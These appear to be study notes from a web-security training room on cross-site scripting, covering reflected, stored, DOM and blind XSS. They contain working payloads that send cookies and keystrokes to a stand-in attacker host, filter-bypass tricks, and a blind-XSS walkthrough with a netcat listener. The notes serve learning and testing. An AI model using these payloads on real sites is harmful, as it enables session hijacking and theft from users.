### **I. What is XSS?**

- Injection attack where malicious JavaScript is injected into a web application.
- Executed by other users.
### **II. XSS Payloads:**

- JavaScript code to be executed.
- Two parts:
    - **Intention:** What the JavaScript should do.
    - **Modification:** Changes to the code for specific scenarios.
- **Examples of Intentions:**
    - **Proof of Concept:** `<script>alert('XSS');</script>`
    - **Session Stealing:** `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
    - **Key Logger:** `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
    - **Business Logic:** `<script>user.changeEmail('attacker@hacker.thm');</script>`
### **III. XSS Types:**

- **Reflected XSS:**
    - User-supplied data in an HTTP request is included in the webpage source without validation.
    - _Example:_ 
    ![screenshot](../../../images/Pasted image 20250211204917.png)

    - **Testing:** Test all input points (URL parameters, file path, headers).
- **Stored XSS:**
    - Payload is stored on the web application (database).
    - Executed when other users visit the page.
    - _Example:_ 
    ![screenshot](../../../images/Pasted image 20250211204953.png)
    
    - **Testing:** Test all data storage points accessible to other users. Try modifying client-side input restrictions.
- **DOM Based XSS:**
    - JavaScript execution happens directly in the browser.
    - Website JavaScript acts on user input (e.g., `window.location.hash`).
    - **Testing:** Look for code that accesses variables controlled by the attacker (e.g., `window.location.x`). Check how these values are used (DOM manipulation, `eval()`).
- **Blind XSS:**
    - Payload is stored on the website, but the attacker cannot see it executing.
    - _Example:_ A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.
    - **Testing:** Use payloads with callbacks (HTTP requests) to confirm execution. XSS Hunter Express is a useful tool.
### **IV. XSS Payload Construction:**

- **Adapt to Context:** Payloads must be tailored to how the input is reflected in the HTML.
- **Escaping:** Close tags or attributes to inject JavaScript.
- **Encoding:** Can be used to bypass some filters.
- **Bypassing Filters:**
    - **Double Encoding:** Encode characters twice.
    - **Case Variation:** `&lt;script&gt;`
    - **HTML Entities:** Use HTML entity equivalents for characters.
    - **Null Bytes:** `%00` (older PHP versions).
    - **Filter Evasion:** `<sscriptcript>` (if "script" is filtered).
    - **Image `onload`:** `<img src="/images/cat.jpg" onload="alert('THM');">`
- **Polyglots:** Single payload that works in multiple contexts.
### **V. Blind XSS Example (Support Ticket):**

1. **Inject Payload:** `</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`
2. **Setup Listener (Netcat):** `nc -nlvp 9001`
3. **Receive Cookie:** The `fetch` request will send the cookie to your listener.
4. **Decode Cookie:** Use a base64 decoder.
### **VI. Key Takeaways:**

- XSS is a common and serious vulnerability.
- Payloads must be crafted for the specific context.
- Filters can often be bypassed with clever encoding or other tricks.
- Blind XSS requires callbacks to confirm exploitation.